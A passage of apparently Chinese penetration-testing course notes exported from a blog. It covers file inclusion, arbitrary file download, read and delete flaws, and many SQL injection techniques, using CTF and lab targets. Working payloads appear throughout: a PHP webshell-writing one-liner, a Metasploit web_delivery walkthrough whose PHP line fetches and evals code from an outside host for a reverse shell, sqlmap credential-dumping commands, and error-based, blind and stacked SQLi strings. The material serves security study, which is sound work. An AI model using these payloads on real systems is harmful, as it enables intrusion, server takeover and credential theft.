system(&#x27;ver&#x27;)?&gt;     不同的操作系统，系统命令不同，需要根据实际情况更换不同的命令    通过input命令执行写入shell：&lt;?PHP fputs(fopen(&#x27;s.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;    RCE命令执行方法二：    直接拼接在url上：data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>#案例4-拓展-LFI实例CMS&amp;RFI结合MSF</p>
<ul>
<li>```php<br>#ekucms包含日志getshell基本原理：该cms有文件包含漏洞，当我们构造一个payload会在它的日志下有记录，所以我们完全可以访问该url，构造一个一句话木马，然后使用文件包含漏洞包含它的日志文件，即可成功流程：想办法包含文件-文件来源（能不能上传）不能上传：包含系统自身文件渗透，包含日志文件渗透能上传：吃西瓜#RFI结合MSF-exploit/multi/script/web_delivery基本原理：通过在msf上生成一个可以反弹shell的马，然后将该马通过文件包含的RCE    命令如下：        1、msfconsole        2、use exploit/multi/script/web_delivery   后面接收模块        3、show targets         4、set 1         这是选择php        5、set target 1        6、set payload php/meterpreter_reverse_tcp        7、show options        8、set lhost 192.168.127.189        9、exploit -j         10、接着会输出一串信息            php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a href="http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;">http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;</a>            我们只需要获取到双引号里面的内容即可，但是这个payload显示不全，所以需要给他补全            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?>        20、接下来就通过在浏览器url后面拼接 php://input  ,并且postpayload，msf那里就可反弹shell            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例5-CTF-初中级比赛真题包含考点</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [ACTF2020 新生赛]Includehttps://buuoj.cn/challengesI春秋“百度杯”CTF比赛 2017 二月场 50 includehttps://www.ichunqiu.com/battalion?t=1&amp;r=57475</span><br></pre></td></tr></table></figure></li>
</ul>
<p>文件包含php的各种伪协议及其适用版本：</p>
<ul>
<li><img src="https://qqadapt.qpic.cn/txdocpic/0/3ce53a8a61da628bf2e3f6d60889a9a5/0?w=889&h=328" alt="img">        </li>
</ul>
<p>各个脚本语言所支持的伪协议</p>
<ul>
<li><img src="https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&h=527" alt="img">        </li>
</ul>
<h2 id="30、文件下载-amp-文件读取-amp-文件删除安全"><a href="#30、文件下载-amp-文件读取-amp-文件删除安全" class="headerlink" title="30、文件下载&amp;文件读取&amp;文件删除安全"></a>30、文件下载&amp;文件读取&amp;文件删除安全</h2><p>#知识点：</p>
<p>1、文件下载&amp;文件读取&amp;文件删除</p>
<p>2、原理&amp;应用&amp;检测利用&amp;赛题或CMS</p>
<p>#详细点：</p>
<p>文件下载</p>
<ul>
<li><p>观察url里是否有变量+文件名的情况，如果有，尝试更换文件名，看能否下载其他文件</p>
</li>
<li><p>技巧</p>
<ul>
<li>有时候明明是一个下载的页面，但是打开后却提示页面找不到，那么我们可以尝试将get请求换成post请求即可下载</li>
</ul>
</li>
<li><p>常规下载URL：<a href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a></p>
</li>
<li><p>可能存在安全URL：<a href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a></p>
</li>
<li><p>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</p>
</li>
</ul>
<p>文件读取</p>
<ul>
<li>目录遍历：文件和文件夹暴露<ul>
<li>原因：目录权限或设置有问题</li>
</ul>
</li>
<li>读取类似下载 读取文件内容 小米路由器演示</li>
<li>利用：常规读取敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</li>
</ul>
<p>文件删除</p>
<ul>
<li>可能存在安全问题：<ul>
<li>前台或后台有删除功能应用，必须网站有删除的功能，才有可能发生任意文件下载</li>
</ul>
</li>
<li>利用：常规删除重装锁定配合程序重装或高危操作<ul>
<li>一般是删除install/install_lock.txt ,删除后，再次访问install目录，就会提示重装网站，这是我们完全可以使网站连接我们自己的数据库，然后拿下服务器权限</li>
</ul>
</li>
</ul>
<p>黑盒：以上文件包含，下载，删除，读取等安全漏洞，</p>
<ul>
<li>基本都是通过观察参数名传输，来尝试修改的参数值测试是否存在这类安全问题</li>
</ul>
<p>#案例1-文件下载-某博客自定义文件下载</p>
<ul>
<li>疑问：如果下载的参数被加密了怎么办？<ul>
<li>1、将参数解密，比如base解码</li>
<li>2、构造需要下载的其他文件</li>
<li>3、将构造的文件名进行base64编码</li>
<li>4、将编码后的文件名拼接到参数那里进行尝试下载</li>
<li><img src="/source/images/image-20210807170941944.png" alt="image-20210807170941944"></li>
</ul>
</li>
</ul>
<p>#案例2-文件读取-小米路由器任意文件读取</p>
<ul>
<li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li>
</ul>
<p>#案例3-文件删除-海洋影视后台任意文件删除</p>
<ul>
<li>后台任意文件删除配合重装-<a href="https://xz.aliyun.com/t/3805">https://xz.aliyun.com/t/3805</a></li>
</ul>
<p>#案例4-CTF赛题-[RoarCTF 2019]EasyJava复现</p>
<ul>
<li><p><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</a></p>
</li>
<li><p>必备知识点：java的敏感目录是WEB-INF，所以碰到文件读取或下载，我们可以尝试下载/WEB-INF/web.xml</p>
</li>
<li><p>WEB-INF主要包含一下文件或目录:</p>
<ul>
<li>/WEB-INF/web.xml：<ul>
<li>Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则，里面有很多文件都是用点 ‘.’  来进行连接的，点 ‘.’  类似于目录的斜杠 /  </li>
</ul>
</li>
<li>/WEB-INF/classes/：<ul>
<li>含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中，需要结合web.xml里获取到的源代码文件，将里面的点 ‘.’ 换成斜杠 /  然后拼接到/WEB-INF/classes/ 后面，后缀是class，然后通过文件下载或读取获取内容，获取到内容，然后适用IDEA里即可自动进行反编译<ul>
<li><img src="/source/images/image-20210807170305564.png" alt="image-20210807170305564"></li>
<li><img src="/source/images/image-20210807170355415.png" alt="image-20210807170355415"></li>
<li><img src="/source/images/image-20210807170515806.png" alt="image-20210807170515806"></li>
</ul>
</li>
</ul>
</li>
<li>/WEB-INF/lib/：<ul>
<li>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
</ul>
</li>
<li>/WEB-INF/src/：<ul>
<li>源码目录，按照包名结构放置各个java文件。</li>
</ul>
</li>
<li>/WEB-INF/database.properties：<ul>
<li>数据库配置文件</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞检测以及利用方法：</p>
<ul>
<li>下载漏洞-配置文件-获取文件架构-下载后反编译源码</li>
<li>通过找到web.xml文件，推断class文件的路径，</li>
<li>最后直接class文件，在通过反编译class文件，得到网站源码获取flag</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>16-20、渗透测试(xiaodi)</title>
    <url>/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
    <content><![CDATA[<p>16、XFF&amp;HTTP头&amp;Post&amp;Cookie注入</p>
<p>案例1-原理分析-测试代码段解释</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例1-原理分析-测试代码段解释</span><br><span class="line">https://www.cnblogs.com/zhao-/p/10994615.html</span><br><span class="line">https://www.w3school.com.cn/php/php_superglobals.asp</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html; charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">$get=$_GET[&#x27;g&#x27;];</span><br><span class="line">$post=$_POST[&#x27;p&#x27;];</span><br><span class="line">$cookie=$_COOKIE[&#x27;c&#x27;];</span><br><span class="line">$request=$_REQUEST[&#x27;r&#x27;];        #既接收get请求，也接收post请求</span><br><span class="line">$host=$_SERVER[&#x27;HTTP_HOST&#x27;];       #接收请求头里的host</span><br><span class="line">$user_agent=$_SERVER[&quot;HTTP_USER_AGENT&quot;];       #接收请求头里的浏览器agent</span><br><span class="line">$ip=$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];          #接收请求头里的ip来源</span><br><span class="line">#以下是显示每个变量</span><br><span class="line">echo $get.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $post.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $cookie.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $request.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $host.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $user_agent.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $ip;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-应用场景-提交方式&amp;接受信息</span><br><span class="line">场景1：常见登录数据请求方法</span><br><span class="line">	① 登录框注入</span><br><span class="line">	② 万能密码</span><br><span class="line">场景2：常见访问者来源IP判断</span><br><span class="line">	X-Forwarded-For: </span><br><span class="line">场景3：常见访问者浏览器信息判断</span><br><span class="line">https://www.cnblogs.com/lushaoyan/p/11088213.html</span><br><span class="line"></span><br><span class="line">#案例3-SQL注入-POST注入&amp;SQLMAP</span><br><span class="line">#注意事项：再使用万能密码的时候，一定要带上正确的账号，比如admin，因为通过组合，语句就是 admin&#x27; or &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;</span><br><span class="line">		根据优先级的不同，and优先级高于or，所以会先对  &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;   进行判断，因为密码必定是错的，所以这个语句整个都是假，接着就是  admin&#x27; or 假     因为admin是我们发现的已经存在的账号，所以  真 or 假 = 真   ，最终成功登录</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">#使用sqlmap读取数据包来进行post注入</span><br><span class="line">python sqlmap.py -r post.txt --current-db</span><br><span class="line">python sqlmap.py -r post.txt --tables -D &quot;purchase&quot; </span><br><span class="line">python sqlmap.py -r post.txt --columns -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line">python sqlmap.py -r post.txt --dump -C &quot;username,password,thekey&quot; -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line"></span><br><span class="line">#案例4-SQL注入-HTTP头注入&amp;SQLMAP</span><br><span class="line">#对host的位置进行注入</span><br><span class="line">#注意：host原来的数据千万不能删除，我们sql注入只需要再原来的host后面进行拼接即可</span><br><span class="line">order by 4</span><br><span class="line">union select 1,flag,3,4 from flag</span><br><span class="line"></span><br><span class="line">#案例5-SQL注入-XFF头IP注入&amp;SQLMAP</span><br><span class="line">#在  X-Forwarded-For:     位置进行注入</span><br><span class="line">python sqlmap.py -r xff.txt --current-db</span><br><span class="line">python sqlmap.py -r xff.txt --tables -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --columns -T user -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --dump -C &quot;username,password&quot; -T user -D &quot;webcalendar&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="17、SQL注入-amp-Json-amp-Base64-amp-格式类型"><a href="#17、SQL注入-amp-Json-amp-Base64-amp-格式类型" class="headerlink" title="17、SQL注入&amp;Json&amp;Base64&amp;格式类型"></a>17、SQL注入&amp;Json&amp;Base64&amp;格式类型</h2><p>#案例1-参数格式-数字&amp;字符&amp;JSON等注入测试</p>
<ul>
<li>```python<br>一、字符型与数字型#技巧：字符型必须要考虑闭合单引号，以及注释掉后面的单引号，常用注释符有 –+    #  – (1)借用Sqlilabs-Less1&amp;2讲解，本地及应用场景’ union select 1,2,3–+union select 1,2,3##搜索框注入原理：我们在搜索的时候，有时候搜索 1 ，一般内容胡总和标题里有 1 的都会显示出来，因为他是用通配符 % 来进行匹配的，同时，搜索框一般既能搜索数字型，也可以搜索字符型，所以在查询语句中，一般都会将变量用单引号引起来，依据该原理，正常的搜索处的语句是：select * from zzz_user where name like ‘%$name%’#注入方法：所以如果搜索功能存在注入点，我们注入的时候就需要考虑单引号和通配符的闭合二、json型格式的注入#应用场景：很多时候，网站post的数据并不是 a=1&amp;b=3  结构的，有的是json格式的：{“username”:”admin”}#基本原理，网站获取到json格式，然后用json_decode 对json进行提取，比如这里就是提取到的数据就是 admin  ，因为admin是字符型，所以在组合到数据库查询语句里会将其用单引号引起来，比如   $sql = “SELECT * FROM users WHERE username = ‘{$username}’”;    所以，当我们注入的时候，只需要在键 username所对应的值 admin后面拼接sql语句即可，但是必须要首先闭合前面的单引号，然后注释掉后面的不要的句子本地模拟登陆数据传输&amp;某WEB赛题数据数据{“username”:”admin’ order by 3#”}     #当order by 4，页面异常，所以长度为3{“username”:”-admin’ union select 1,2,3#”}#易错点:    1、这里的注释，必须要用井号’ # ‘来注释    2、必须要将unino前面的语句置错，所以在admin前面加上负号  - <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-数据处理-编码BASE64&amp;加密MD5等注入测试</span><br><span class="line"></span><br><span class="line">- 技巧：先解密，然后组合payload，接着再加密，进行访问</span><br><span class="line">  - MD5-借用某案例进行说明利用-原理</span><br><span class="line">  - BASE64-借用某案例进行复现测试-原理     </span><br><span class="line"></span><br><span class="line">\#案例3-SQL操作-查询&amp;插入&amp;更新&amp;删除&amp;堆叠等测试</span><br><span class="line"></span><br><span class="line">学习目的：不同的数据库操作对应不同的注入方式，比如数据库查询操作，一般都是用select，因为它有回显，所以一般采用联合注入；但是数据库的插入、更新、删除等等，是没有回显的，所以它就只能盲注了</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  select-查询-应用场景分析-SQL查询演示select * from zhibo_test.m_sms where id=1;#这里的zhibo_test.m_sms 表示数据库zhibo_test下的表m_smsinsert-插入-应用场景分析-SQL插入演示insert into zhibo_test.m_sms values(&#x27;66&#x27;,&#x27;register&#x27;,&#x27;13345677654&#x27;,&#x27;1234&#x27;,&#x27;0&#x27;,&#x27;11.11.1.1&#x27;,&#x27;15345333321&#x27;);update-更新-应用场景分析-SQL更新演示update zhibo_test.m_sms set username=&#x27;xiaodi&#x27; where id=27;delete-删除-应用场景分析-SQL删除演示delete from m_sms where id=28;堆叠测试-执行-应用场景分析-SQL多条演示select * from m_sms;delete from m_sms where id=66;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注"><a href="#18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注" class="headerlink" title="18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注"></a>18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注</h2><p>SQL注入盲注</p>
<ul>
<li>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：<ul>
<li>基于布尔的SQL盲注-逻辑判断<ul>
<li>regexp,like,ascii,left,ord,mid</li>
</ul>
</li>
<li>基于时间的SQL盲注-延时判断<ul>
<li>if,sleep</li>
</ul>
</li>
<li>基于报错的SQL盲注-报错回显<ul>
<li>floor，updatexml，extractvalue</li>
<li>参考链接<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>什么时候该用盲注？什么时候该用联合注入？</p>
<ul>
<li>在无法爆出显示位的时候就要用盲注了</li>
<li>注册、更新信息、删除信息、发表新内容等地方只有一个提示成功的字眼，所以这里也是盲注，一般常用布尔盲注和报错的盲注</li>
</ul>
<p>联合注入和盲注的易错点：</p>
<ul>
<li><strong>联合注入需要将union前面的语句置错，但是盲注却不需要，因为他是用and拼接的，所以肯定不能置错的</strong></li>
</ul>
<p>盲注语法基础：</p>
<p>多个语句的意义：有时候我们一个字母一个字母爆破名字的时候，可能网站会过滤单引号，那么ord和ascii的语法就可以派上用场了</p>
<ul>
<li>like ‘ro%’            #判断ro或ro…是否成立，如果没有通配符%,那么 like ‘admin’  就是精准匹配，只匹配值等于admin的</li>
<li>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等，模糊匹配，regexp ‘admin’ 只要包含admin的就显示，比如admin1 admin2</li>
<li>if(条件,5,0)           #条件成立 返回5 反之 返回0</li>
<li>sleep(5)              #SQL语句延时执行5秒</li>
<li>mid和substr：用法一样<ul>
<li>mid(a,b,c)            #从位置b开始，截取a字符串的c位</li>
<li>substr(a,b,c)         #从位置b开始，截取字符串a的c长度</li>
</ul>
</li>
<li>left(database(),1)，database() #left(a,b)从左侧截取a的前b位</li>
<li>length(database())=8  #判断数据库database()名的长度</li>
<li>ord和ascii：用法一样 </li>
<li>ascii(x)=97 #判断x的ascii码是否等于97</li>
</ul>
<p>SQL查询方式注入</p>
<ul>
<li>语法：<ul>
<li>select,insert,update,delete,orderby等</li>
</ul>
</li>
<li>注入出现位置：<ul>
<li>正常url界面</li>
<li>用户注册、发表新内容等位置</li>
<li>修改内容、删除内容等功能</li>
</ul>
</li>
</ul>
<h3 id="盲注基本知识"><a href="#盲注基本知识" class="headerlink" title="盲注基本知识"></a>盲注基本知识</h3><p>基本语法：</p>
<p>select * from member where username like ‘vi%’;</p>
<p>select * from member where username regexp ‘^x’;</p>
<ul>
<li>匹配除了x的其他字符， 符号  ^   代表 除了 … </li>
</ul>
<p>select * from member where id=1 and sleep(1);</p>
<ul>
<li>查询成功后，并且延迟1秒</li>
</ul>
<p>select * from member where id=1 and if(1&gt;2,sleep(1),0);</p>
<ul>
<li>首先查询，接着进行判断，如果1&gt;2 ，就延迟1秒，否则立刻显示</li>
</ul>
<p>select * from member where id=1 and if(1&lt;2,sleep(1),0);</p>
<p>select * from member where id=1 and length(database())=7;</p>
<ul>
<li>判断当前数据库的名字的长度是否等于7，如果是，则查询结果正常显示，否则不显示</li>
</ul>
<p>select * from member where id=1 and left(database(),1)=’p’;</p>
<ul>
<li>判断当前数据库的名字的从左到右的第一个字符是不是 p ，如果是，则查询结果正常显示，否则不显示</li>
</ul>
<p>select * from member where id=1 and left(database(),2)=’pi’;</p>
<ul>
<li>判断当前数据库的名字的从左到右的前2个字符是不是 pi ，如果是，则查询结果正常显示，否则不显示</li>
</ul>
<p>select * from member where id=1 and substr(database(),1,1)=’p’;</p>
<ul>
<li>截取当前数据库的名字，从第1位开始，截取1位，比如sec，截取的结果就是s，这里截取后判断其是否等于 p ，如果是，则页面正常显示</li>
</ul>
<p>select * from member where id=1 and substr(database(),2,1)=’i’;</p>
<ul>
<li>截取当前数据库的名字，从第2位开始，截取1位，比如sec，截取的结果就是e，这里截取后判断其是否等于 i ，如果是，则页面正常显示</li>
</ul>
<p>select * from member where id=1 and ord(left(database(),1))=112;</p>
<ul>
<li>判断当前数据库的名字从左到右的第1位的字符转换为ascii码后是不是等于112，如果是，则页面返回正常</li>
</ul>
<p>#案例1-Pikachu-查询注入测试（报错盲注)</p>
<p>Pikachu insert</p>
<ul>
<li><p>技巧：直接套用即可，在用户注册，新增内容的位置都可以尝试</p>
</li>
<li><p>易错点：就算我们是在手机号的位置进行注入，但是我们也要完全套用这个模板，不需要去掉单引号</p>
</li>
<li><p>```php<br>username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit username=x’ or updatexml(1,concat(0x7e,(version())),0) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit    username=x’ or extractvalue(1,concat(0x7e,database())) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731124312971](/source/images/image-20210731124312971.png)</span><br><span class="line"></span><br><span class="line">- ![image-20210731125026616](/source/images/image-20210731125026616.png)</span><br><span class="line"></span><br><span class="line">Pikachu update</span><br><span class="line"></span><br><span class="line">- 直接套用，适用于修改内容处</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=Nicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&amp;email=wuhan&amp;submit=submit</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Pikachu delete</p>
<ul>
<li><p>直接套用，适用于删除内容的位置</p>
</li>
<li><p>易错点：下面的三个payload与原有的语句的连接是用+号，比如下面的59和or之间就是用 + 号进行连接</p>
<ul>
<li>127.0.0.1/pikachu-master/vul/sqli/sqli_del.php?id=59+or+updatexml+<br>(1,concat(0x7e,user()),0)</li>
</ul>
</li>
<li><p>```php<br>+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)    +or+updatexml+(1,concat(0x7e,database()),0)    +or+extractvalue(1,concat(0x7e,database()))</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731130124225](/source/images/image-20210731130124225.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-Sqlilabs-less5注入测试（布尔盲注）</span><br><span class="line"></span><br><span class="line">- 特点：显示位出不来</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &#x27;and left(version(),1)=5#&#x27;and length(database())=8#    &#x27;and left(database(),1)&gt;&#x27;a&#x27;--+&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br></pre></td></tr></table></figure></li>
</ul>
<p>#案例3-Sqlilabs-less2注入测试（延时盲注）</p>
<ul>
<li>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</li>
<li>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)–+</li>
</ul>
<p>#案例4-Sqlilabs-less46注入测试（排序盲注）</p>
<p>参考注入天书</p>
<p>#案例5-引出实战-某CMS黑盒测试SQL查询注入</p>
<ul>
<li>黑盒测试发布修改(insert,update)盲注测试<ul>
<li>‘ and left(database(),1)&gt;’z’ or ‘ 返回0</li>
<li>‘ and left(database(),1)=’z’ or ‘ 返回1</li>
<li>‘ and left(database(),2)=’zz’ or ‘ 返回1</li>
<li>‘ and left(database(),5)=’zzcms’ or ‘ 返回1</li>
<li><img src="/source/images/image-20210731131731783.png" alt="image-20210731131731783"></li>
<li><img src="/source/images/image-20210731131749308.png" alt="image-20210731131749308"></li>
<li><img src="/source/images/image-20210731131838109.png" alt="image-20210731131838109"></li>
<li><img src="/source/images/image-20210731132003828.png" alt="image-20210731132003828"></li>
</ul>
</li>
</ul>
<h2 id="19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入"><a href="#19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入" class="headerlink" title="19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入"></a>19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入</h2><p>#案例1-堆叠注入-BUUCTF-[强网杯 2019]随便注</p>
<p>适用场景：在网站禁掉了select、where等关键字后，可以尝试看存不存在堆叠注入</p>
<p>检测堆叠注入：</p>
<ul>
<li><p>如果是数字型，直接在后面加上分号 ; 看页面是否正常，不正常则代表不存在堆叠注入</p>
</li>
<li><p>如果是字符型，在闭合单引号的情况下，然后加上分号 ; 如果页面正常，则存在堆叠注入</p>
</li>
<li><p>```python<br>解题方法一：堆叠注入：根据数据库类型决定是否支持多条语句执行’;show databases;’;show tables;’;show columns from <code>1919810931114514</code>;’;select flag from <code>1919810931114514</code>;     #这是错误写法，因为select被过滤了#下面语句中的 0x73656c656374202a2066726f6d20603139313938313039333131313435313460 是注入语句：select * from <code>1919810931114514</code>  转换成16进制的，这里因为表  1919810931114514 是纯数字，所以必须要用 <code>  </code>   这两个符号基本原理：首先将注入语句转成16进制（数据库支持16进制），接着将数据赋值给局部变量a(@代表局部声明变量)，接着再次预编译 局部变量a，将其放在 execsql里，最后执行execsql’;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;解题方法二参考连接：<a href="https://www.cnblogs.com/peri0d/p/12123814.html%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%80%E5%85%B12%E4%B8%AA%E8%A1%A8%EF%BC%8C%E4%B8%80%E4%B8%AA%E8%A1%A8%E6%98%AFflag%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AFwords%EF%BC%8C%E6%89%80%E4%BB%A5%E9%BB%98%E8%AE%A4%E7%9A%84%E8%A1%A8%E4%B8%80%E5%AE%9A%E6%98%AFwords%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AA%E9%9C%80%E8%A6%81%E5%B0%86%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E8%A1%A8%E6%94%B9%E4%B8%BAwords%E5%8D%B3%E5%8F%AF%E3%80%82%E9%A6%96%E5%85%88%E5%B0%86words%E9%9A%8F%E4%BE%BF%E6%94%B9%E4%B8%AA%E5%90%8D%E5%AD%97%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86flag%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BAwords%EF%BC%8C%E6%89%80%E4%BB%A5%E6%96%B0%E7%9A%84words%E8%A1%A8%E9%87%8C%E5%92%8C%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E9%87%8C%E5%82%A8%E5%AD%98%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8E%A5%E7%9D%80%E9%80%9A%E8%BF%87%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96flag/?inject=1&#39;;RENAME">https://www.cnblogs.com/peri0d/p/12123814.html原理：一共2个表，一个表是flag，一个是words，所以默认的表一定是words，我们只需要将原来的flag表改为words即可。首先将words随便改个名字，然后将flag重命名为words，所以新的words表里和原来的flag里储存的数据是一样的，我们接着通过另一个查询语句，即可成功获取flag/?inject=1&#39;;RENAME</a> TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23查询flag：   /?inject=1’ or ‘1’=’1   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-二次注入-BUUCTF-[RCTF2015]EasySQL</span><br><span class="line"></span><br><span class="line">- 应用场景：留言、评论、新用户注册的昵称</span><br><span class="line"></span><br><span class="line">  - 网站对用户存储的语句仅仅通过对部分字符进行转义来防止sql注入，接着又将该语句存储到数据库中了（比如留言，新注册的用户的昵称），为了用户存储和显示的内容一致，所以就将转义前的语句存储起来了，这样既保持了用户数据的一致性，也杜绝了sql注入，但是却可以产生二次注入</span><br><span class="line"></span><br><span class="line">- 利用方法：</span><br><span class="line"></span><br><span class="line">  - 首先判断当前位置过滤了啥，比如我们在用户名处插入payload，很大几率失败(用户名格式不正确)，所以我们需要通过fuzz搞清楚它到底过滤了什么关键字或者字符</span><br><span class="line">    - 注册账户抓包，然后将用户名那里设置变量，加载fuzz字典，接着观察看哪些字符可以使用</span><br><span class="line">      - 易错点：记得把空格加进去，有很多地方过滤了空格</span><br><span class="line">  - 其次需要写入sql语句，存储到网站</span><br><span class="line">  - 最后调用之前写入的内容</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  功能点：注册（昵称构造payload）-登录-修改（就会触发数据库对该用户和其相关信息的匹配，从而导致二次注入）（insert-select-update）确定注入点-构造Payload-确定过滤-重新构造Payload#构造初始payload，发现错误，提示用户名不合法x&quot; or updatexml(1,concat(0x7e,(version())),0)##下面这个语句就可以创建用户成功，因为通过fuzz发现过滤的是空格，但是删除空格，or就和sql语句连在一起了，所以我们完全可以用字符  ^  来代替  or   